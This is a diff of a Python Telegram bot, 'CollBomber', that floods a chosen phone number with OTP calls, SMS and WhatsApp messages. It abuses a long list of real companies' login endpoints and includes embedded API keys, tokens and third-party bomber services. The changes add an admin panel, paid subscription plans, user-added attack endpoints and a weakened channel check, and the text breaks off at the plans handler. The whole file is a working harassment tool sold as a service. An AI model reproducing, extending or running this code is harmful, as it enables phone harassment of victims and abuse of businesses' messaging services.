@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 🔥 CollBomber Telegram Bot — Ultra Fast Mode (Heroku Ready)
-250+ APIs | Call + SMS + WhatsApp + Mix | Multi-threaded
+250+ APIs | Call + SMS + WhatsApp + Mix | Auto-Restart | Full Admin Panel
 """
 
 import telebot
@@ -15,7 +15,6 @@ import re
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime, timedelta
 import json
-from collections import defaultdict
 import hashlib
 import os
 import sys
@@ -46,8 +45,6 @@ SMS_MAX_WORKERS = int(os.environ.get("SMS_MAX_WORKERS", 50))
 DELAY_BETWEEN_ROUNDS = float(os.environ.get("DELAY_BETWEEN_ROUNDS", 0.3))
 SMS_DELAY_BETWEEN_ROUNDS = float(os.environ.get("SMS_DELAY_BETWEEN_ROUNDS", 0.1))
 SMS_DOUBLE_FIRE = os.environ.get("SMS_DOUBLE_FIRE", "true").lower() == "true"
-SMS_AUTO_RETRY = os.environ.get("SMS_AUTO_RETRY", "true").lower() == "true"
-
 IMPORTANT_CALL_INTERVAL = 3
 IMPORTANT_5S_INTERVAL = 3
 
@@ -57,13 +54,14 @@ IMPORTANT_5S_INTERVAL = 3
 _admin_env = os.environ.get("ADMIN_IDS", "8128821116")
 ADMIN_IDS = [int(x.strip()) for x in _admin_env.split(",") if x.strip().isdigit()]
 ADMIN_DB_PATH = os.environ.get("ADMIN_DB_PATH", "admin_db.json")
+CUSTOM_APIS_PATH = "custom_apis.json"
 
 # ============================================================
 # CHANNEL CONFIG
 # ============================================================
 REQUIRED_CHANNEL = os.environ.get("REQUIRED_CHANNEL", "@rolexxbomber")
 CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/rolexxbomber")
-WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", "https://imgh.in/host/gdzq2c")
+CHANNEL_CHECK_ENABLED = os.environ.get("CHANNEL_CHECK", "true").lower() == "true"
 
 bot = telebot.TeleBot(API_TOKEN, threaded=True)
 
@@ -156,11 +154,24 @@ class AdminDB:
                 return True
             return False
 
+    def get_banned_list(self):
+        with self.lock:
+            return list(self.data.get("banned", []))
+
     def add_admin(self, user_id, added_by):
         with self.lock:
             uid = str(user_id)
             if uid not in self.data["admins"]:
                 self.data["admins"].append(uid)
+                self._save()
+                return True
+            return False
+
+    def remove_admin(self, user_id):
+        with self.lock:
+            uid = str(user_id)
+            if uid in self.data["admins"]:
+                self.data["admins"].remove(uid)
                 self._save()
                 return True
             return False
@@ -254,11 +265,14 @@ class AdminDB:
             if not sub:
                 return None
             if sub.get("expires_at"):
-                expires = datetime.fromisoformat(sub["expires_at"])
-                if datetime.now() > expires:
-                    sub["active"] = False
-                    self._save()
-                    return None
+                try:
+                    expires = datetime.fromisoformat(sub["expires_at"])
+                    if datetime.now() > expires:
+                        sub["active"] = False
+                        self._save()
+                        return None
+                except Exception:
+                    pass
             return sub
 
     def get_all_keys(self):
@@ -267,17 +281,53 @@ class AdminDB:
 
     def get_premium_users(self):
         with self.lock:
-            return self.data.get("premium_users", [])
+            return list(self.data.get("premium_users", []))
 
-    def reset_premium(self, user_id):
+    def get_premium_count(self):
+        with self.lock:
+            count = 0
+            for uid in self.data.get("premium_users", []):
+                sub = self.data.get("subscriptions", {}).get(uid)
+                if sub and sub.get("active", True):
+                    if sub.get("expires_at"):
+                        try:
+                            if datetime.now() < datetime.fromisoformat(sub["expires_at"]):
+                                count += 1
+                        except Exception:
+                            count += 1
+                    else:
+                        count += 1
+            return count
+
+    def give_premium(self, user_id, days=30, plan="custom"):
         with self.lock:
             uid = str(user_id)
-            if uid in self.data.get("premium_users", []):
-                self.data["premium_users"].remove(uid)
-            if uid in self.data.get("subscriptions", {}):
-                del self.data["subscriptions"][uid]
+            self.data.setdefault("subscriptions", {})
+            self.data.setdefault("premium_users", [])
+            now = datetime.now()
+            expires = (now + timedelta(days=days)).isoformat()
+            self.data["subscriptions"][uid] = {
+                "plan": plan, "started_at": now.isoformat(),
+                "expires_at": expires, "max_concurrent": 5,
+                "max_hours": 24, "price": 0, "active": True
+            }
+            if uid not in self.data["premium_users"]:
+                self.data["premium_users"].append(uid)
             self._save()
             return True
+
+    def remove_premium(self, user_id):
+        with self.lock:
+            uid = str(user_id)
+            removed = False
+            if uid in self.data.get("premium_users", []):
+                self.data["premium_users"].remove(uid)
+                removed = True
+            if uid in self.data.get("subscriptions", {}):
+                del self.data["subscriptions"][uid]
+                removed = True
+            self._save()
+            return removed
 
     def update_api_stats(self, api_name, success):
         with self.lock:
@@ -293,39 +343,95 @@ class AdminDB:
         with self.lock:
             return self.data.get("api_stats", {})
 
-    def add_admin_contact(self, admin_id):
-        with self.lock:
-            uid = str(admin_id)
-            if uid not in self.data.get("admin_contacts", []):
-                self.data.setdefault("admin_contacts", []).append(uid)
-                self._save()
-                return True
-            return False
-
-    def remove_admin_contact(self, admin_id):
-        with self.lock:
-            uid = str(admin_id)
-            if uid in self.data.get("admin_contacts", []):
-                self.data["admin_contacts"].remove(uid)
-                self._save()
-                return True
-            return False
-
-    def get_admin_contacts(self):
-        with self.lock:
-            return self.data.get("admin_contacts", [])
-
-    def save_contact_message(self, msg_id, user_id, admin_id, message):
+    def add_contact_message(self, user_id, username, message):
         with self.lock:
             self.data.setdefault("contact_messages", {})
-            self.data["contact_messages"][str(msg_id)] = {
-                "user_id": str(user_id), "admin_id": str(admin_id),
-                "message": message, "timestamp": datetime.now().isoformat(),
-                "replied": False
+            msg_id = str(uuid.uuid4().hex[:10])
+            self.data["contact_messages"][msg_id] = {
+                "id": msg_id,
+                "user_id": str(user_id),
+                "username": username or "Unknown",
+                "message": message,
+                "timestamp": datetime.now().isoformat(),
+                "replied": False,
+                "reply_text": None
             }
             self._save()
+            return msg_id
+
+    def get_contact_message(self, msg_id):
+        with self.lock:
+            return self.data.get("contact_messages", {}).get(str(msg_id))
+
+    def mark_replied(self, msg_id, reply_text):
+        with self.lock:
+            if str(msg_id) in self.data.get("contact_messages", {}):
+                self.data["contact_messages"][str(msg_id)]["replied"] = True
+                self.data["contact_messages"][str(msg_id)]["reply_text"] = reply_text
+                self._save()
+                return True
+            return False
+
+    def get_pending_contacts(self):
+        with self.lock:
+            pending = []
+            for mid, msg in self.data.get("contact_messages", {}).items():
+                if not msg.get("replied"):
+                    pending.append(msg)
+            return pending
 
 admin_db = AdminDB()
+
+# ============================================================
+# CUSTOM API STORAGE
+# ============================================================
+class CustomAPIDB:
+    def __init__(self, path=CUSTOM_APIS_PATH):
+        self.path = path
+        self.lock = threading.Lock()
+        self.data = self._load()
+
+    def _load(self):
+        try:
+            with open(self.path, 'r') as f:
+                return json.load(f)
+        except (FileNotFoundError, json.JSONDecodeError):
+            return {"apis": []}
+
+    def _save(self):
+        try:
+            with open(self.path, "w") as f:
+                json.dump(self.data, f, indent=2)
+        except Exception as e:
+            logger.error(f"Custom API save error: {e}")
+
+    def add_api(self, name, url, method, headers, body, category):
+        with self.lock:
+            self.data["apis"].append({
+                "name": name, "url": url, "method": method.upper(),
+                "headers": headers or {}, "body": body, "category": category,
+                "added_at": datetime.now().isoformat()
+            })
+            self._save()
+            return True
+
+    def remove_api(self, name):
+        with self.lock:
+            before = len(self.data["apis"])
+            self.data["apis"] = [a for a in self.data["apis"] if a["name"] != name]
+            after = len(self.data["apis"])
+            self._save()
+            return before != after
+
+    def get_all(self):
+        with self.lock:
+            return list(self.data["apis"])
+
+    def count(self):
+        with self.lock:
+            return len(self.data["apis"])
+
+custom_api_db = CustomAPIDB()
 
 # ============================================================
 # API CONFIG CLASS
@@ -366,12 +472,12 @@ class ApiConfig:
         return final_url, headers, body
 
 # ============================================================
-# ALL APIS — 250+ MERGED
+# ALL APIS
 # ============================================================
 def get_all_apis():
     apis = []
 
-    # ====== CALL APIs (60+) ======
+    # ====== CALL APIs ======
     call_apis = [
         ApiConfig("TataCapital_Call", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "POST",
                   {"Content-Type": "application/json"}, '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}', "call"),
@@ -412,8 +518,7 @@ def get_all_apis():
                   {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","loginFlowType":"MOBILE","alternateNumber":""}', "call"),
         ApiConfig("MagicPin_Call", "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/", "POST",
                   {"Content-Type": "application/json", "auth-secret-key": "kQLMCQBrfevxhzuPpFWT",
-                   "origin": "https://magicpin.in", "x-requested-with": "mark.via.gp",
-                   "referer": "https://magicpin.in/"},
+                   "origin": "https://magicpin.in", "x-requested-with": "mark.via.gp"},
                   '{"phoneNumber":"91{phone}","authMethod":"call","token":""}', "call"),
         ApiConfig("Astroyogi_Call", "https://comm.astroyogi.com/api/OtpComm/SendOtp", "POST",
                   {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg4NDU0MTc4LCJleHAiOjE3OTYyMzAxNzh9."},
@@ -426,9 +531,6 @@ def get_all_apis():
         ApiConfig("Snitch_Call", "https://www.snitch.com/api/auth/resend-otp?mode=voice", "POST",
                   {"Content-Type": "application/json", "X-CAP-Token": "015a4adb4fcebceb:dcd8d06bbd9311f025af80eaeeb8e0"},
                   '{"mobile_number":"+91{phone}"}', "call"),
-        ApiConfig("Ixigo_Call", "https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp", "POST",
-                  {"Content-Type": "application/x-www-form-urlencoded"},
-                  'token=0732ff21f3263cee48320831c049192e22ffa805b4ca14add9c963945e4de6dde05739779f718e1fe35faa7297ac035389752adfda0548baf249b0d9fdc6a05f&sixDigitOTP=true&prefix=%2B91&phone={phone}&resendOnCall=true', "call"),
         ApiConfig("Hotstar_Call", "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=resendOtp", "POST",
                   {"Content-Type": "application/json", "x-hs-platform": "mweb", "x-country-code": "in"},
                   '{"body":{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","phone_number":"{phone}","initiate_by":1,"recaptcha_token":"","source":0}}', "call"),
@@ -478,7 +580,6 @@ def get_all_apis():
         ApiConfig("Thakur_Call", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET", {}, None, "call"),
         ApiConfig("Eyecon_Call", "https://api.eyecon-app.com/app/cli_auth/gettransport", "GET",
                   {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, None, "call"),
-        # ─── NEW CALL APIs ───
         ApiConfig("Proptiger_Call", "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call", "POST",
                   {"Content-Type": "application/json"}, '{"contactNumber":"{phone}","domainId":"2"}', "call"),
         ApiConfig("Ola_Voice", "https://api.olacabs.com/v1/voice-otp", "POST",
@@ -502,7 +603,7 @@ def get_all_apis():
     ]
     apis.extend(call_apis)
 
-    # ====== WHATSAPP APIs (30+) ======
+    # ====== WHATSAPP APIs ======
     whatsapp_apis = [
         ApiConfig("KPN_WhatsApp", "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "POST",
                   {"Content-Type": "application/json"}, '{"phone_number":{"number":"{phone}","country_code":"+91"}}', "whatsapp"),
@@ -523,28 +624,22 @@ def get_all_apis():
         ApiConfig("Refyne_WA", "https://prod-api.refyne.co.in/auth/v3/send-otp", "POST",
                   {"Content-Type": "application/json"}, '{"channel":"WHATSAPP","recipient":"{phone}"}', "whatsapp"),
         ApiConfig("MakeMyTrip_WA", "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&language=eng&currency=inr", "POST",
-                  {"Content-Type": "application/json", "vid": "{uuid}", "tid": "{uuid}", "deviceid": "{uuid}", "region": "in", "language": "eng", "currency": "inr"},
-                  '{"loginId":"{phone}","type":6,"isEncoded":false,"channel":["MOBILE","WHATSAPP"],"appHashKey":"@www.makemytrip.com #","countryCode":"91"}', "whatsapp"),
+                  {"Content-Type": "application/json", "vid": "{uuid}", "tid": "{uuid}", "deviceid": "{uuid}"},
+                  '{"loginId":"{phone}","type":6,"isEncoded":false,"channel":["MOBILE","WHATSAPP"],"countryCode":"91"}', "whatsapp"),
         ApiConfig("Housing_WA", "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API", "POST",
-                  {"Content-Type": "application/json", "phoenix-api-name": "LOGIN_SEND_OTP_API", "app-name": "mobile_web_buyer"},
+                  {"Content-Type": "application/json", "app-name": "mobile_web_buyer"},
                   '{"query":"mutation($phone:String,$otpLength:Int,$channel:String){sendOtp(phone:$phone,otpLength:$otpLength,channel:$channel){success message}}","variables":{"phone":"{phone}","otpLength":4,"channel":"whatsapp"}}', "whatsapp"),
         ApiConfig("HERE_WA", "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal", "POST",
                   {"Content-Type": "application/json"}, '{"mobile":"{phone}","countryCodeId":"b43569eb-6798-43fb-8d27-47d55d7c544b","source":"whatsapp"}', "whatsapp"),
         ApiConfig("VisitApp_WA", "https://api.getvisitapp.com/v3/new-auth/login-phone", "POST",
                   {"Content-Type": "application/json"}, '{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{phone}","platform":"WEB"}', "whatsapp"),
-        ApiConfig("RegistaniaChar_WA", "https://admin.registaniachar.com/api/whatsapp/send-otp", "POST",
-                  {"Content-Type": "application/json", "X-Signature": "6d31a2232ee5ec6e868d2eade30e657ddce8f6ff4b417818313feef6a220a553"},
-                  '{"phone":"{phone}"}', "whatsapp"),
         ApiConfig("MuscleBlaze_WA", "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9", "GET",
                   {"HKAUTH": "396144437|9l7fQT5m5HJtTrXqRZiWdQ==", "pageuri": "/", "st": "9", "plt": "2"}, None, "whatsapp"),
         ApiConfig("RedBus_WA", "https://www.redbus.in/hotels/api/sendOtpV2", "POST",
                   {"Content-Type": "application/json"}, '{"phoneCode":"91","mobile":"{phone}","whatsappOptin":true,"reCaptchaResponse":"{random_md5}"}', "whatsapp"),
-        ApiConfig("Agoda_WA", "https://www.agoda.com/ul/api/v1/auth", "POST",
-                  {"Content-Type": "application/json"}, '{"email":"","keepMeSignedIn":false,"whatsapp":"+91{phone}"}', "whatsapp"),
         ApiConfig("MagicPin_WA", "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/", "POST",
                   {"Content-Type": "application/json", "auth-secret-key": "kQLMCQBrfevxhzuPpFWT", "origin": "https://magicpin.in", "x-requested-with": "mark.via.gp"},
                   '{"phoneNumber":"91{phone}","authMethod":"whatsapp","token":"{random_md5}"}', "whatsapp"),
-        # ─── NEW WA APIs ───
         ApiConfig("Foxy_WA", "https://www.foxy.in/api/v2/users/send_otp", "POST",
                   {"Content-Type": "application/json"}, '{"user":{"phone_number":"+91{phone}"},"via":"whatsapp"}', "whatsapp"),
         ApiConfig("Stratzy_WA", "https://stratzy.in/api/web/whatsapp/sendOTP", "POST",
@@ -560,13 +655,10 @@ def get_all_apis():
     ]
     apis.extend(whatsapp_apis)
 
-    # ====== SMS APIs (150+) ======
+    # ====== SMS APIs ======
     sms_apis = [
         ApiConfig("Lenskart", "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "POST",
                   {"Content-Type": "application/json"}, '{"phoneCode":"+91","telephone":"{phone}"}'),
-        ApiConfig("Lenskart_V2", "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "POST",
-                  {"Content-Type": "application/json", "X-API-Client": "mobilesite", "X-Country-Code": "IN"},
-                  '{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}'),
         ApiConfig("NoBroker", "https://www.nobroker.in/api/v3/account/otp/send", "POST",
                   {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}&countryCode=IN"),
         ApiConfig("PharmEasy", "https://pharmeasy.in/api/v2/auth/send-otp", "POST",
@@ -903,8 +995,6 @@ def get_all_apis():
         ApiConfig("Happi_SMS", "https://dev-services.happimobiles.com/api/user-login/homepage", "POST",
                   {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
         ApiConfig("ThakurBombCyber", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET", {}, None),
-
-        # ───────────── NEW SMS APIs (from your list) ─────────────
         ApiConfig("Hungama_OTP", "https://communication.api.hungama.com/v1/communication/otp", "POST",
                   {"Content-Type": "application/json", "identifier": "home"},
                   '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}'),
@@ -1050,8 +1140,6 @@ def get_all_apis():
                   '{"user":{"phone_number":"+91{phone}"},"via":"sms"}'),
         ApiConfig("Licious2", "https://www.licious.in/api/login/signup", "POST",
                   {"Content-Type": "application/json"}, '{"phone":"{phone}","captcha_token":null}'),
-
-        # ───────────── GET APIs ─────────────
         ApiConfig("SMS_Bomber_Worker", "http://sms-bomber.subhxcosmo.workers.dev/api?num={phone}", "GET", {}, None),
         ApiConfig("Bomberrr_Vercel", "https://bomberrr.vercel.app/?key=roots&number={phone}", "GET", {}, None),
         ApiConfig("Bolbet", "https://bolbet-liart.vercel.app/?key=roots&number={phone}", "GET", {}, None),
@@ -1071,13 +1159,22 @@ def get_all_apis():
         ApiConfig("Cashify", "https://www.cashify.in/api/cu01/v1/app-link?mn={phone}", "GET", {}, None),
         ApiConfig("JustDial", "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={phone}", "GET", {}, None),
         ApiConfig("Airtel_Referral", "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={phone}", "GET", {}, None),
-
-        # ───────────── EXTERNAL BOMBER APIs ─────────────
         ApiConfig("FreeFire_Bomber", "https://freefire-api.ct.ws/bomber4.php?phone={phone}&duration=30", "GET", {}, None),
         ApiConfig("RootX_Bomber", "https://bomber-rootxindia.satyamrajsingh562.workers.dev/start?key=demo&n={phone}", "GET", {}, None),
         ApiConfig("Bombom_Worker", "https://bombom.hb3284008.workers.dev/?mobile={phone}", "GET", {}, None),
     ]
     apis.extend(sms_apis)
+
+    # ====== CUSTOM ADMIN-ADDED APIs ======
+    try:
+        for capi in custom_api_db.get_all():
+            apis.append(ApiConfig(
+                capi["name"], capi["url"], capi["method"],
+                capi.get("headers", {}), capi.get("body"),
+                capi.get("category", "sms")
+            ))
+    except Exception as e:
+        logger.error(f"Custom API load error: {e}")
 
     return apis
 
@@ -1087,6 +1184,14 @@ CALL_APIS = [a for a in ALL_APIS if a.category == "call"]
 SMS_APIS = [a for a in ALL_APIS if a.category == "sms"]
 WHATSAPP_APIS = [a for a in ALL_APIS if a.category == "whatsapp"]
 logger.info(f"Loaded: {len(ALL_APIS)} total | {len(CALL_APIS)} call | {len(SMS_APIS)} sms | {len(WHATSAPP_APIS)} WA")
+
+def reload_apis():
+    global ALL_APIS, CALL_APIS, SMS_APIS, WHATSAPP_APIS
+    ALL_APIS = get_all_apis()
+    CALL_APIS = [a for a in ALL_APIS if a.category == "call"]
+    SMS_APIS = [a for a in ALL_APIS if a.category == "sms"]
+    WHATSAPP_APIS = [a for a in ALL_APIS if a.category == "whatsapp"]
+    logger.info(f"🔄 Reloaded: {len(ALL_APIS)} total")
 
 # ============================================================
 # IMPORTANT APIS
@@ -1139,7 +1244,6 @@ class UltraBomber:
         try:
             url, headers, body = api.build_request(phone)
             headers["Accept"] = "application/json, text/plain, */*"
-            headers["Accept-Encoding"] = "gzip, deflate"
             headers["Connection"] = "keep-alive"
             if api.method.upper() == "POST":
                 resp = self.http_session.post(url, headers=headers, data=body, timeout=8,
@@ -1335,6 +1439,7 @@ class UltraBomber:
                     f"✅ Hits: 0/0\n"
                     f"📊 Progress: [{'░' * 30}] 0.0%\n"
                     f"🎯 Mode: *{mode.upper()}*\n"
+                    f"📡 APIs: {len(ALL_APIS)}\n"
                     f"────────────────────\n"
                     f"⚡ Attack initiated...",
                     parse_mode="Markdown", reply_markup=stop_markup)
@@ -1398,17 +1503,48 @@ class UltraBomber:
 bomber = UltraBomber()
 
 # ============================================================
-# CHANNEL CHECK
+# ✅ FIXED CHANNEL CHECK — 403 & 400 Handled
 # ============================================================
 def is_channel_member(user_id):
+    """
+    Safe channel check — handles:
+    - 403: bot was blocked by user / user not member
+    - 400: member list inaccessible (bot not admin)
+    Fallbacks gracefully without crashing.
+    """
+    # Admin always allowed
     if user_id in ADMIN_IDS:
         return True
+
+    # If channel check disabled globally, allow everyone
+    if not CHANNEL_CHECK_ENABLED:
+        return True
+
     try:
         member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
-        return member.status in ["member", "administrator", "creator"]
+        status = getattr(member, "status", None)
+        return status in ["member", "administrator", "creator"]
     except Exception as e:
-        logger.warning(f"Channel check failed for {user_id}: {e}")
-        return admin_db.is_verified(user_id)
+        error_str = str(e).lower()
+
+        # 403 — user ne bot block kiya ya channel mein nahi hai
+        if "403" in error_str or "blocked" in error_str or "forbidden" in error_str:
+            logger.debug(f"403 channel check for {user_id} → not a member")
+            return False
+
+        # 400 — bot admin nahi hai channel mein, member list inaccessible
+        if "400" in error_str or "member list is inaccessible" in error_str or "chat not found" in error_str:
+            logger.warning(f"⚠️ Bot is NOT admin of {REQUIRED_CHANNEL}!")
+            logger.warning(f"⚠️ Please add bot as admin to enable channel check.")
+            # Fail-safe: verified users ko allow karo, baaki ko bhi allow (grace mode)
+            if admin_db.is_verified(user_id):
+                return True
+            # Bot admin nahi → grace mode mein sabko allow
+            return True
+
+        # Koi aur error — default allow (bot crash na ho)
+        logger.warning(f"Channel check error for {user_id}: {e} — allowing by default")
+        return True
 
 # ============================================================
 # KEYBOARDS
@@ -1430,8 +1566,31 @@ def main_keyboard(user_id=None):
         types.KeyboardButton("🛑 Stop"),
     ]
     if user_id and (user_id in ADMIN_IDS or admin_db.is_admin(user_id)):
-        buttons.append(types.KeyboardButton("⚙️ Admin"))
+        buttons.append(types.KeyboardButton("⚙️ Admin Panel"))
     markup.add(*buttons)
+    return markup
+
+def admin_keyboard():
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("📊 Stats", callback_data="adm_stats"),
+        types.InlineKeyboardButton("👥 Users", callback_data="adm_users"),
+        types.InlineKeyboardButton("⭐ Premium List", callback_data="adm_premium_list"),
+        types.InlineKeyboardButton("💰 Give Premium", callback_data="adm_premium_give"),
+        types.InlineKeyboardButton("❌ Remove Premium", callback_data="adm_premium_remove"),
+        types.InlineKeyboardButton("🚫 Ban User", callback_data="adm_ban"),
+        types.InlineKeyboardButton("✅ Unban User", callback_data="adm_unban"),
+        types.InlineKeyboardButton("🚫 Banned List", callback_data="adm_banned_list"),
+        types.InlineKeyboardButton("🔑 Generate Key", callback_data="adm_genkey"),
+        types.InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast"),
+        types.InlineKeyboardButton("➕ Add API", callback_data="adm_add_api"),
+        types.InlineKeyboardButton("📋 List APIs", callback_data="adm_list_apis"),
+        types.InlineKeyboardButton("🔍 Check API", callback_data="adm_check_api"),
+        types.InlineKeyboardButton("🗑️ Remove API", callback_data="adm_remove_api"),
+        types.InlineKeyboardButton("📡 API Stats", callback_data="adm_apistats"),
+        types.InlineKeyboardButton("📩 Pending Contacts", callback_data="adm_pending_contacts"),
+        types.InlineKeyboardButton("💬 Reply to User", callback_data="adm_reply_user"),
+    )
     return markup
 
 # ============================================================
@@ -1440,113 +1599,136 @@ def main_keyboard(user_id=None):
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     chat_id = message.chat.id
-    if admin_db.is_banned(chat_id):
-        bot.reply_to(message, "🚫 Aap ban ho chuke hain.")
-        return
-    if not is_channel_member(chat_id):
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
-        markup.add(types.InlineKeyboardButton("✅ Joined", callback_data="check_joined"))
+    try:
+        if admin_db.is_banned(chat_id):
+            bot.reply_to(message, "🚫 Aap ban ho chuke hain. Admin se contact karein.")
+            return
+        if not is_channel_member(chat_id):
+            markup = types.InlineKeyboardMarkup()
+            markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
+            markup.add(types.InlineKeyboardButton("✅ Joined", callback_data="check_joined"))
+            bot.send_message(chat_id,
+                f"👋 *Welcome!*\n\nBot use karne ke liye pehle channel join karein:\n\n👉 {CHANNEL_LINK}",
+                parse_mode="Markdown", reply_markup=markup)
+            return
+        user_data.users[chat_id] = {"phone": None, "pending_mode": None}
         bot.send_message(chat_id,
-            f"👋 *Welcome!*\n\nBot use karne ke liye pehle channel join karein:\n\n👉 {CHANNEL_LINK}",
-            parse_mode="Markdown", reply_markup=markup)
-        return
-    user_data.users[chat_id] = {"phone": None, "pending_mode": None}
-    bot.send_message(chat_id,
-        f"🔥 *CollBomber Bot Active!*\n\n"
-        f"📞 CALL | 💬 SMS | 📱 WHATSAPP | 🔥 MIX | 💥 Bulk MIX\n\n"
-        f"📊 Total APIs Loaded: *{len(ALL_APIS)}*\n\n"
-        f"Target number bhejein (10 digits):",
-        parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
+            f"🔥 *CollBomber Bot Active!*\n\n"
+            f"📞 CALL | 💬 SMS | 📱 WHATSAPP | 🔥 MIX | 💥 Bulk MIX\n\n"
+            f"📊 Total APIs: *{len(ALL_APIS)}*\n"
+            f"📞 Call: {len(CALL_APIS)} | 💬 SMS: {len(SMS_APIS)} | 📱 WA: {len(WHATSAPP_APIS)}\n\n"
+            f"Target number bhejein (10 digits):",
+            parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
+    except Exception as e:
+        logger.error(f"cmd_start error: {e}")
 
 @bot.message_handler(commands=['help'])
 def cmd_help(message):
-    bot.reply_to(message,
-        "❓ *Help*\n\n"
-        "1️⃣ Number bhejein (10 digits)\n"
-        "2️⃣ Mode select karein\n"
-        "3️⃣ Bombing start ho jayegi\n"
-        "4️⃣ 🛑 Stop se band karein\n\n"
-        f"📊 Total APIs: {len(ALL_APIS)}\n"
-        f"📞 Call: {len(CALL_APIS)} | 💬 SMS: {len(SMS_APIS)} | 📱 WA: {len(WHATSAPP_APIS)}",
-        parse_mode="Markdown")
+    try:
+        bot.reply_to(message,
+            "❓ *Help*\n\n"
+            "1️⃣ Number bhejein (10 digits)\n"
+            "2️⃣ Mode select karein\n"
+            "3️⃣ Bombing start ho jayegi\n"
+            "4️⃣ 🛑 Stop se band karein\n\n"
+            f"📊 Total APIs: {len(ALL_APIS)}\n"
+            f"📞 Call: {len(CALL_APIS)} | 💬 SMS: {len(SMS_APIS)} | 📱 WA: {len(WHATSAPP_APIS)}\n\n"
+            "*Commands:*\n"
+            "/start — Restart\n/status — Session status\n/stop — Stop bombing\n"
+            "/plans — Subscription plans\n/redeem — Redeem key\n"
+            "/account — Your account\n/contact — Contact admin",
+            parse_mode="Markdown")
+    except Exception as e:
+        logger.error(f"cmd_help error: {e}")
 
 @bot.message_handler(commands=['status'])
 def cmd_status(message):
-    chat_id = message.chat.id
-    st = bomber.get_status(chat_id)
-    if not st:
-        bot.reply_to(message, "❌ Koi active session nahi hai.")
-        return
-    pct = (st['ok'] / max(st['total'], 1)) * 100
-    bar_len = 30
-    filled = int(bar_len * pct / 100)
-    bar = "█" * filled + "░" * (bar_len - filled)
-    bot.reply_to(message,
-        f"📊 *Session Status*\n────────────────────\n"
-        f"💣 Target: `{st['phone']}`\n🎯 Mode: {st['mode'].upper()}\n"
-        f"✅ Hits: {st['ok']}/{st['total']}\n📊 [{bar}] {pct:.1f}%\n"
-        f"⏱️ Elapsed: {st['elapsed']}\n🔄 Rounds: {st['rounds']}",
-        parse_mode="Markdown")
+    try:
+        chat_id = message.chat.id
+        st = bomber.get_status(chat_id)
+        if not st:
+            bot.reply_to(message, "❌ Koi active session nahi hai.")
+            return
+        pct = (st['ok'] / max(st['total'], 1)) * 100
+        bar_len = 30
+        filled = int(bar_len * pct / 100)
+        bar = "█" * filled + "░" * (bar_len - filled)
+        bot.reply_to(message,
+            f"📊 *Session Status*\n────────────────────\n"
+            f"💣 Target: `{st['phone']}`\n🎯 Mode: {st['mode'].upper()}\n"
+            f"✅ Hits: {st['ok']}/{st['total']}\n📊 [{bar}] {pct:.1f}%\n"
+            f"⏱️ Elapsed: {st['elapsed']}\n🔄 Rounds: {st['rounds']}",
+            parse_mode="Markdown")
+    except Exception as e:
+        logger.error(f"cmd_status error: {e}")
 
 @bot.message_handler(commands=['stop'])
 def cmd_stop(message):
-    ok, msg = bomber.stop(message.chat.id)
-    bot.reply_to(message, msg, parse_mode="Markdown")
+    try:
+        ok, msg = bomber.stop(message.chat.id)
+        bot.reply_to(message, msg, parse_mode="Markdown")
+    except Exception as e:
+        logger.error(f"cmd_stop error: {e}")
 
 @bot.message_handler(commands=['plans'])
 def cmd_plans(message):
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        types.InlineKeyboardButton("📅 Daily — ₹40", callback_data="plan_daily"),
-        types.InlineKeyboardButton("📅 Monthly — ₹199", callback_data="plan_monthly"),
-        types.InlineKeyboardButton("📅 3 Months — ₹499", callback_data="plan_3month"),
-    )
-    bot.reply_to(message, "📋 *Subscription Plans*\n\nSelect a plan:", parse_mode="Markdown", reply_markup=markup)
+    try:
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            types.InlineKeyboardButton("📅 Daily — ₹40", callback_data="plan_daily"),
